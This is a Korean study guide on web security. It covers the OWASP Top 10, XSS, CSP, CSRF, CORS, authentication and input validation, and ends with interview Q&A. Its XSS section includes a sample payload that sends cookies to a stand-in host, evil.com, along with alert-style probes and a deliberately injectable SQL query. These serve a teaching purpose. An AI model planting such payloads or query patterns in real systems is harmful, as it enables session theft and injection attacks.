# 웹 보안

## 개요

**정의**: 웹 보안은 웹 애플리케이션을 악의적인 공격으로부터 보호하기 위한 기술과 방법론의 집합으로, OWASP Top 10을 기준으로 주요 취약점을 식별하고 방어한다.

**목적**: 사용자 데이터 보호, 시스템 무결성 유지, 규정 준수(GDPR, HIPAA 등), 비즈니스 신뢰성 확보를 달성한다.

---

## 핵심 개념

### OWASP Top 10 (2021)

| 순위 | 취약점 | 설명 |
|------|--------|------|
| 1 | Broken Access Control | 권한 우회, 무단 접근 |
| 2 | Cryptographic Failures | 암호화 미흡, 민감정보 노출 |
| 3 | Injection | SQL, NoSQL, OS, LDAP 인젝션 |
| 4 | Insecure Design | 설계 단계 보안 결함 |
| 5 | Security Misconfiguration | 보안 설정 오류 |
| 6 | Vulnerable Components | 취약한 라이브러리 사용 |
| 7 | Auth Failures | 인증/세션 관리 결함 |
| 8 | Integrity Failures | 소프트웨어/데이터 무결성 검증 미흡 |
| 9 | Logging Failures | 로깅/모니터링 부족 |
| 10 | SSRF | 서버 측 요청 위조 |

---

## XSS (Cross-Site Scripting)

### XSS 유형

```
┌─────────────────────────────────────────────────────────────┐
│                      XSS 공격 유형                           │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Stored XSS (저장형)                                      │
│  ┌─────────┐    악성스크립트    ┌─────────┐                 │
│  │ 공격자  │ ───────────────► │   DB    │                 │
│  └─────────┘                   └────┬────┘                 │
│                                     │                       │
│                    스크립트 포함 페이지                       │
│  ┌─────────┐                   ┌────▼────┐                 │
│  │ 피해자  │ ◄─────────────── │ 서버    │                 │
│  └─────────┘                   └─────────┘                 │
│                                                              │
│  2. Reflected XSS (반사형)                                   │
│  ┌─────────┐    악성링크 클릭   ┌─────────┐                 │
│  │ 피해자  │ ───────────────► │ 서버    │                 │
│  └─────────┘ ◄─────────────── └─────────┘                 │
│               스크립트 반사                                  │
│                                                              │
│  3. DOM-based XSS                                           │
│  ┌─────────┐    악성URL       ┌─────────────┐              │
│  │ 피해자  │ ───────────────► │ 클라이언트  │              │
│  └─────────┘                   │ JavaScript │              │
│               DOM 조작으로 실행  └─────────────┘              │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### XSS 공격 예시

```javascript
// 취약한 코드: 사용자 입력을 그대로 렌더링
document.getElementById('output').innerHTML = userInput;

// 공격 페이로드 예시
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
```

### XSS 방어

```javascript
// 1. 출력 인코딩 (HTML 이스케이프)
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// 사용
element.textContent = userInput;  // 안전 (자동 이스케이프)
element.innerHTML = escapeHtml(userInput);  // 수동 이스케이프

// 2. DOMPurify 라이브러리 사용
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// 3. React의 자동 이스케이프
function Component({ userInput }) {
  // JSX는 자동으로 이스케이프됨
  return <div>{userInput}</div>;

  // dangerouslySetInnerHTML은 위험
  // return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
}
```

### CSP (Content Security Policy)

```html
<!-- HTTP 헤더로 설정 (권장) -->
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'

<!-- 메타 태그로 설정 -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' https://trusted.cdn.com">
```

**CSP 디렉티브**:

| 디렉티브 | 설명 | 예시 |
|----------|------|------|
| `default-src` | 기본 정책 | `'self'` |
| `script-src` | JavaScript 소스 | `'self' 'nonce-xxx'` |
| `style-src` | CSS 소스 | `'self' 'unsafe-inline'` |
| `img-src` | 이미지 소스 | `'self' data: https:` |
| `connect-src` | XHR, WebSocket 등 | `'self' api.example.com` |
| `frame-ancestors` | iframe 임베딩 허용 | `'none'` |

```javascript
// nonce 기반 스크립트 허용
// 서버에서 매 요청마다 새 nonce 생성
const nonce = crypto.randomBytes(16).toString('base64');

// HTML에 적용
<script nonce="abc123">
  // 이 스크립트만 실행 허용
</script>
```

---

## CSRF (Cross-Site Request Forgery)

### CSRF 공격 원리

```
┌─────────────────────────────────────────────────────────────┐
│                      CSRF 공격 흐름                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. 사용자가 정상 사이트 로그인 (쿠키 저장)                    │
│  ┌─────────┐        로그인         ┌─────────────┐          │
│  │ 사용자  │ ─────────────────►   │ bank.com    │          │
│  └─────────┘ ◄───────────────────  │ (쿠키 발급) │          │
│                                    └─────────────┘          │
│                                                              │
│  2. 공격자 사이트 방문                                        │
│  ┌─────────┐        방문           ┌─────────────┐          │
│  │ 사용자  │ ─────────────────►   │ evil.com    │          │
│  └─────────┘                       └──────┬──────┘          │
│                                           │                  │
│  3. 숨겨진 요청 자동 전송 (쿠키 자동 포함)                     │
│                    ┌──────────────────────┘                  │
│                    ▼                                         │
│             ┌─────────────┐                                  │
│             │ bank.com    │  ← POST /transfer               │
│             │ 송금 실행!   │    (사용자 쿠키 포함)             │
│             └─────────────┘                                  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### CSRF 방어

```javascript
// 1. CSRF 토큰 (Synchronizer Token Pattern)
// 서버에서 토큰 생성 및 세션에 저장
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
  }
  next();
});

// 폼에 토큰 포함
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <button type="submit">송금</button>
</form>

// 서버에서 토큰 검증
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('CSRF token invalid');
  }
  // 정상 처리
});

// 2. SameSite 쿠키 속성
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'Strict'  // 또는 'Lax'
});

// 3. Double Submit Cookie
// 쿠키와 요청 본문/헤더에 같은 토큰 포함
const csrfToken = generateToken();
res.cookie('csrf', csrfToken, { httpOnly: false });

// 클라이언트에서 요청 시
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrf')
  }
});
```

**SameSite 쿠키 옵션**:

| 옵션 | 설명 | 사용 사례 |
|------|------|----------|
| `Strict` | 동일 사이트에서만 전송 | 최고 보안 필요 |
| `Lax` | GET 요청은 허용 | 기본값 (Chrome) |
| `None` | 항상 전송 (Secure 필수) | 크로스 사이트 필요 |

---

## CORS (Cross-Origin Resource Sharing)

### 동일 출처 정책 (Same-Origin Policy)

```
출처(Origin) = 프로토콜 + 호스트 + 포트

https://example.com:443/path

┌───────────────────────────────────────────────────────────┐
│                    Same-Origin 판단                        │
├───────────────────────────────────────────────────────────┤
│ 기준: https://example.com                                  │
│                                                            │
│ https://example.com/page      ✓ Same (경로만 다름)         │
│ https://example.com:443       ✓ Same (기본 포트)           │
│ http://example.com            ✗ Different (프로토콜)       │
│ https://api.example.com       ✗ Different (서브도메인)     │
│ https://example.com:8080      ✗ Different (포트)           │
│ https://example.org           ✗ Different (도메인)         │
└───────────────────────────────────────────────────────────┘
```

### CORS 동작 방식

```
┌─────────────────────────────────────────────────────────────┐
│                    CORS 요청 흐름                            │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Simple Request (GET, POST with simple headers)              │
│  ┌─────────┐        요청          ┌─────────┐               │
│  │ 브라우저 │ ─────────────────►  │  서버   │               │
│  │         │ ◄─────────────────   │         │               │
│  └─────────┘   응답 + CORS 헤더   └─────────┘               │
│                                                              │
│  Preflight Request (PUT, DELETE, custom headers)             │
│  ┌─────────┐     OPTIONS         ┌─────────┐               │
│  │ 브라우저 │ ─────────────────►  │  서버   │               │
│  │         │ ◄─────────────────   │         │               │
│  │         │   CORS 허용 확인     │         │               │
│  │         │                      │         │               │
│  │         │     실제 요청        │         │               │
│  │         │ ─────────────────►  │         │               │
│  │         │ ◄─────────────────   │         │               │
│  └─────────┘        응답          └─────────┘               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### CORS 헤더 설정

```javascript
// Express.js CORS 설정
const cors = require('cors');

// 기본 설정 (모든 origin 허용 - 개발용)
app.use(cors());

// 프로덕션 설정
app.use(cors({
  origin: ['https://example.com', 'https://app.example.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,  // 쿠키 포함 허용
  maxAge: 86400  // preflight 캐시 (24시간)
}));

// 수동 설정
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://example.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');

  // Preflight 요청 처리
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  next();
});
```

**주요 CORS 헤더**:

| 헤더 | 설명 |
|------|------|
| `Access-Control-Allow-Origin` | 허용할 출처 (`*` 또는 특정 도메인) |
| `Access-Control-Allow-Methods` | 허용할 HTTP 메서드 |
| `Access-Control-Allow-Headers` | 허용할 요청 헤더 |
| `Access-Control-Allow-Credentials` | 쿠키/인증 포함 허용 |
| `Access-Control-Max-Age` | Preflight 캐시 시간 |

---

## 인증/인가

### 안전한 인증 구현

```javascript
// 1. 비밀번호 해싱 (bcrypt)
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

// 회원가입 시 해싱
const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);

// 로그인 시 검증
const isValid = await bcrypt.compare(inputPassword, hashedPassword);

// 2. JWT 토큰
const jwt = require('jsonwebtoken');

// 토큰 생성
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,
  { expiresIn: '1h' }
);

// 토큰 검증
const decoded = jwt.verify(token, process.env.JWT_SECRET);

// 3. Refresh Token 패턴
const accessToken = jwt.sign(payload, ACCESS_SECRET, { expiresIn: '15m' });
const refreshToken = jwt.sign(payload, REFRESH_SECRET, { expiresIn: '7d' });

// Refresh Token은 httpOnly 쿠키로 저장
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'Strict',
  maxAge: 7 * 24 * 60 * 60 * 1000
});
```

### 권한 검사

```javascript
// RBAC (Role-Based Access Control)
const permissions = {
  admin: ['read', 'write', 'delete', 'manage'],
  editor: ['read', 'write'],
  viewer: ['read']
};

function authorize(requiredPermission) {
  return (req, res, next) => {
    const userRole = req.user.role;
    if (!permissions[userRole]?.includes(requiredPermission)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

// 사용
app.delete('/posts/:id', authenticate, authorize('delete'), deletePost);
```

---

## 입력 검증

### 서버 측 검증

```javascript
// Joi를 사용한 스키마 검증
const Joi = require('joi');

const userSchema = Joi.object({
  email: Joi.string().email().required(),
  password: Joi.string().min(8).pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/).required(),
  age: Joi.number().integer().min(0).max(150)
});

app.post('/users', async (req, res) => {
  const { error, value } = userSchema.validate(req.body);
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  // 검증된 value 사용
});

// SQL Injection 방지: Parameterized Query
// 취약한 코드
const query = `SELECT * FROM users WHERE id = ${userId}`;  // 위험!

// 안전한 코드
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId]);  // 파라미터화
```

### 클라이언트 측 검증

```typescript
// Zod를 사용한 타입 안전 검증
import { z } from 'zod';

const FormSchema = z.object({
  email: z.string().email('유효한 이메일을 입력하세요'),
  password: z.string()
    .min(8, '8자 이상')
    .regex(/[A-Z]/, '대문자 포함')
    .regex(/[0-9]/, '숫자 포함')
});

type FormData = z.infer<typeof FormSchema>;

// React Hook Form과 함께 사용
import { zodResolver } from '@hookform/resolvers/zod';
import { useForm } from 'react-hook-form';

const { register, handleSubmit, formState: { errors } } = useForm<FormData>({
  resolver: zodResolver(FormSchema)
});
```

---

## 트레이드오프

### 보안 vs 사용성

| 보안 조치 | 보안 강화 | 사용성 영향 | 권장 |
|----------|----------|------------|------|
| 강력한 비밀번호 정책 | 높음 | 가입 장벽 | 균형 필요 |
| 2FA 필수 | 매우 높음 | 불편함 | 선택적 제공 |
| 짧은 세션 타임아웃 | 높음 | 재로그인 빈번 | 적절한 시간 설정 |
| CAPTCHA | 봇 방지 | UX 저하 | 의심 시에만 |

### CSP 정책 수준

| 수준 | 설정 | 보안 | 유연성 |
|------|------|------|--------|
| 엄격 | `script-src 'self'` | 최고 | 낮음 |
| 중간 | `script-src 'self' 'nonce-xxx'` | 높음 | 중간 |
| 느슨 | `script-src 'self' 'unsafe-inline'` | 낮음 | 높음 |

---

## 실무 체크리스트

```yaml
authentication:
  - 비밀번호 bcrypt 해싱 (rounds >= 12)
  - JWT는 httpOnly 쿠키에 저장
  - Refresh Token 회전 구현
  - 로그인 시도 제한 (Rate Limiting)

xss_prevention:
  - 출력 인코딩/이스케이프
  - CSP 헤더 설정
  - DOMPurify로 HTML 정화
  - dangerouslySetInnerHTML 금지

csrf_prevention:
  - CSRF 토큰 구현
  - SameSite 쿠키 설정
  - Origin/Referer 검증

api_security:
  - HTTPS 필수
  - CORS 화이트리스트
  - Rate Limiting
  - 입력 검증 (서버 측)

headers:
  - Strict-Transport-Security
  - X-Content-Type-Options: nosniff
  - X-Frame-Options: DENY
  - Referrer-Policy
```

---

## 면접 포인트

**Q**: XSS와 CSRF의 차이는?

**A**: XSS는 악성 스크립트를 사용자 브라우저에서 실행시키는 공격이고, CSRF는 인증된 사용자의 권한을 도용하여 원치 않는 요청을 보내는 공격이다. XSS는 출력 인코딩과 CSP로, CSRF는 토큰과 SameSite 쿠키로 방어한다.

**Q**: SameSite 쿠키의 Strict와 Lax 차이는?

**A**: Strict는 모든 크로스 사이트 요청에서 쿠키를 전송하지 않아 보안이 강하지만, 외부 링크로 접근 시 로그인이 풀린다. Lax는 GET 요청은 허용하여 링크 클릭 시 로그인이 유지되면서 POST 기반 CSRF는 방어한다. Chrome 기본값은 Lax이다.

**Q**: JWT를 localStorage에 저장하면 안 되는 이유는?

**A**: localStorage는 JavaScript로 접근 가능하여 XSS 공격 시 토큰이 탈취된다. httpOnly 쿠키에 저장하면 JavaScript로 접근할 수 없어 XSS에 안전하다. 다만 CSRF 방어가 추가로 필요하다.

**Q**: CORS는 보안 메커니즘인가?

**A**: CORS 자체는 보안 메커니즘이 아니라 Same-Origin Policy를 완화하는 메커니즘이다. 서버가 허용한 출처만 API에 접근하도록 하지만, 서버 간 통신이나 curl에는 적용되지 않는다. 실제 보안은 인증/인가로 구현해야 한다.

---

## 참고 자료

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MDN - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN - Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
